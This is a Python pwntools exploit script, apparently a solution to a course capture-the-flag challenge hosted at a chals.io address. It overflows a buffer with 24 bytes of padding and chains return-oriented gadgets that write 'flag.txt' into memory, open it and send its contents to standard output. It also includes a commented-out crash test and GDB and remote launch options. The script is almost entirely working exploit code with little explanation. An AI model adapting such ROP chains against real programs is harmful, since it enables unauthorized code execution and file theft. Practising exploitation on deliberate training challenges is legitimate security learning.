from pwn import *
binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse3801-rop-1000.chals.io", 443, ssl=True, sni="cse3801-rop-1000.chals.io")
    else:
        return process(e.path)

p = start()
'''
x = cyclic(500)
p.recvuntil("Would you like to win (Y|N) >>> ")
p.sendline(x)
p.interactive()

'''
writeable_mem = e.sym['__data_start']
padding = b'A'*24
chain = padding

# writeable_mem -> flag.txt
chain += p64(0x4012b8) # pop r14 pop r15; ret;
chain += b'flag.txt' # r14 = flag.txt
chain += p64(writeable_mem) # r15 = writeable_mem
chain += p64(0x4011bd) # mov qword ptr [r15], r14

# open("flag.txt", 0)
chain += p64(0x4012bb) # pop rdi; ret;
chain += p64(writeable_mem) # RDI = flag.txt
chain += p64(0x4011c8) # pop rsi; pop rdx; pop rcx; ret;
chain += p64(0x0) # RSI = 0
chain += p64(0x0) # RDX = 0
chain += p64(0x0) # RCX = 0
chain += p64(0x401070) # open(flag.txt, 0)

# sendfile(1, open("flag.txt", 0), 0, 0x64)
chain += p64(0x4012bb) # pop rdi; ret;
chain += p64(0x1) # RDI = 1
chain += p64(0x4011c8) # pop rsi; pop rdx; pop rcx; ret;
chain += p64(0x3) # RSI = fd = open("flag.txt", 0)
chain += p64(0x0) # RDX = 0
chain += p64(0x64) # RCX = 0x64
chain += p64(0x401060) # address for sendfile

p.recvuntil("Would you like to win (Y|N) >>> ")
p.sendline(chain)

response = p.recvall().decode()
print(response)

p.interactive()
